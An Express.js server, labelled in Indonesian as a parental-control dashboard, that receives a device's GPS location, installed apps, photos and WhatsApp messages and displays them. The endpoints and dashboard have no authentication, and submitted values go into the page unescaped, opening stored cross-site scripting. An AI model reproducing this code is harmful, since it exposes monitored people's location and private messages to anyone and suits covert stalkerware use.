const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Penyimpanan data sementara di memori server
let riwayatLokasi = []; 
let daftarAplikasi = [];
let galeriFoto = [];
let logWhatsApp = [];

// Dashboard Profesional & Modern
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="id">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Parental Control Dashboard</title>
            <style>
                :root {
                    --primary: #4f46e5;
                    --primary-hover: #4338ca;
                    --bg-color: #f8fafc;
                    --card-bg: #ffffff;
                    --text-main: #1e293b;
                    --text-muted: #64748b;
                    --border-color: #e2e8f0;
                }
                body {
                    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
                    background-color: var(--bg-color);
                    color: var(--text-main);
                    margin: 0;
                    padding: 20px;
                }
                .container {
                    max-width: 900px;
                    margin: 0 auto;
                }
                header {
                    text-align: center;
                    margin-bottom: 30px;
                }
                header h1 {
                    color: var(--primary);
                    margin: 0;
                    font-size: 24px;
                }
                header p {
                    color: var(--text-muted);
                    font-size: 14px;
                    margin-top: 5px;
                }
                .card {
                    background: var(--card-bg);
                    border-radius: 12px;
                    padding: 20px;
                    margin-bottom: 20px;
                    box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03);
                    border: 1px solid var(--border-color);
                }
                .card h3 {
                    margin-top: 0;
                    font-size: 16px;
                    color: var(--text-main);
                    border-bottom: 2px solid var(--bg-color);
                    padding-bottom: 10px;
                    display: flex;
                    align-items: center;
                    gap: 8px;
                }
                table {
                    width: 100%;
                    border-collapse: collapse;
                    margin-top: 10px;
                }
                th, td {
                    padding: 12px;
                    text-align: left;
                    font-size: 13px;
                    border-bottom: 1px solid var(--border-color);
                }
                th {
                    background-color: #f1f5f9;
                    color: var(--text-muted);
                    font-weight: 600;
                    text-transform: uppercase;
                    font-size: 11px;
                    letter-spacing: 0.5px;
                }
                tr:hover {
                    background-color: #f8fafc;
                }
                .badge {
                    background-color: #dcfce7;
                    color: #15803d;
                    padding: 4px 8px;
                    border-radius: 6px;
                    font-size: 11px;
                    font-weight: 600;
                }
                .btn-map {
                    background-color: var(--primary);
                    color: white;
                    padding: 6px 12px;
                    border-radius: 6px;
                    text-decoration: none;
                    font-size: 12px;
                    font-weight: 500;
                    transition: background 0.2s;
                    display: inline-block;
                }
                .btn-map:hover {
                    background-color: var(--primary-hover);
                }
                .gallery-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
                    gap: 10px;
                    margin-top: 10px;
                }
                .gallery-item {
                    border-radius: 8px;
                    overflow: hidden;
                    border: 1px solid var(--border-color);
                    background: #f1f5f9;
                    text-align: center;
                }
                .gallery-item img {
                    width: 100%;
                    height: 90px;
                    object-fit: cover;
                    display: block;
                }
                .empty-state {
                    text-align: center;
                    color: var(--text-muted);
                    font-style: italic;
                    padding: 15px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <header>
                    <h1>🛡️ Parental Control Center</h1>
                    <p>Pantauan Aktivitas Perangkat Anak secara Real-Time</p>
                </header>

                <!-- LOKASI GPS -->
                <div class="card">
                    <h3>📍 Riwayat Lokasi GPS</h3>
                    <table>
                        <thead>
                            <tr>
                                <th>Waktu</th>
                                <th>Koordinat</th>
                                <th style="text-align: right;">Aksi</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${riwayatLokasi.length === 0 ? '<tr><td colspan="3" class="empty-state">Belum ada data lokasi</td></tr>' : 
                              riwayatLokasi.map(item => `
                                <tr>
                                    <td>${item.waktu}</td>
                                    <td><code>${item.lat}, ${item.lon}</code></td>
                                    <td style="text-align: right;"><a href="https://maps.google.com/?q=${item.lat},${item.lon}" target="_blank" class="btn-map">Buka Peta</a></td>
                                </tr>`).join('')}
                        </tbody>
                    </table>
                </div>

                <!-- APLIKASI -->
                <div class="card">
                    <h3>📦 Aplikasi Ter-install</h3>
                    <table>
                        <thead>
                            <tr>
                                <th>Nama Aplikasi</th>
                                <th style="text-align: right;">Status</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${daftarAplikasi.length === 0 ? '<tr><td colspan="2" class="empty-state">Belum ada data aplikasi</td></tr>' : 
                              daftarAplikasi.map(app => `
                                <tr>
                                    <td>${app.nama}</td>
                                    <td style="text-align: right;"><span class="badge">${app.keterangan || 'Aktif'}</span></td>
                                </tr>`).join('')}
                        </tbody>
                    </table>
                </div>

                <!-- GALERI FOTO -->
                <div class="card">
                    <h3>🖼️ Galeri / Tangkapan Layar</h3>
                    ${galeriFoto.length === 0 ? '<div class="empty-state">Belum ada foto yang diunggah.</div>' : `
                        <div class="gallery-grid">
                            ${galeriFoto.map(f => `
                                <div class="gallery-item">
                                    <a href="${f.url}" target="_blank"><img src="${f.url}" alt="Foto"></a>
                                </div>`).join('')}
                        </div>
                    `}
                </div>

                <!-- LOG WHATSAPP -->
                <div class="card">
                    <h3>💬 Aktivitas WhatsApp</h3>
                    <table>
                        <thead>
                            <tr>
                                <th>Waktu</th>
                                <th>Pesan / Kontak</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${logWhatsApp.length === 0 ? '<tr><td colspan="2" class="empty-state">Belum ada log WhatsApp</td></tr>' : 
                              logWhatsApp.map(w => `
                                <tr>
                                    <td style="width: 25%;">${w.waktu}</td>
                                    <td><b>${w.kontak}:</b> ${w.pesan}</td>
                                </tr>`).join('')}
                        </tbody>
                    </table>
                </div>
            </div>
        </body>
        </html>
    `);
});

// --- ENDPOINT API PENERIMA DATA ---

// 1. Lokasi
app.post('/api/lapor-lokasi', (req, res) => {
    const { lat, lon } = req.body;
    if (lat && lon) {
        riwayatLokasi.unshift({ lat, lon, waktu: new Date().toLocaleTimeString() });
        if (riwayatLokasi.length > 20) riwayatLokasi.pop();
        res.json({ status: 'success', pesan: 'History lokasi dicatat' });
    } else {
        res.status(400).json({ status: 'error', pesan: 'Lat & lon diperlukan' });
    }
});

// 2. Aplikasi
app.post('/api/lapor-apk', (req, res) => {
    const { apps } = req.body;
    if (apps && Array.isArray(apps)) {
        daftarAplikasi = apps;
        res.json({ status: 'success', pesan: 'Daftar aplikasi diperbarui' });
    } else {
        res.status(400).json({ status: 'error', pesan: 'Format apps harus array' });
    }
});

// 3. WhatsApp
app.post('/api/lapor-wa', (req, res) => {
    const { kontak, pesan } = req.body;
    if (kontak && pesan) {
        logWhatsApp.unshift({ kontak, pesan, waktu: new Date().toLocaleTimeString() });
        res.json({ status: 'success', pesan: 'Log WhatsApp direkam' });
    } else {
        res.status(400).json({ status: 'error', pesan: 'Kontak & pesan diperlukan' });
    }
});

// 4. Galeri / Foto (Baru)
app.post('/api/lapor-foto', (req, res) => {
    const { url } = req.body;
    if (url) {
        galeriFoto.unshift({ url, waktu: new Date().toLocaleTimeString() });
        if (galeriFoto.length > 10) galeriFoto.pop();
        res.json({ status: 'success', pesan: 'Foto berhasil diunggah' });
    } else {
        res.status(400).json({ status: 'error', pesan: 'URL foto diperlukan' });
    }
});

app.listen(PORT, () => {
    console.log(`Server dashboard profesional berjalan di port ${PORT}`);
});
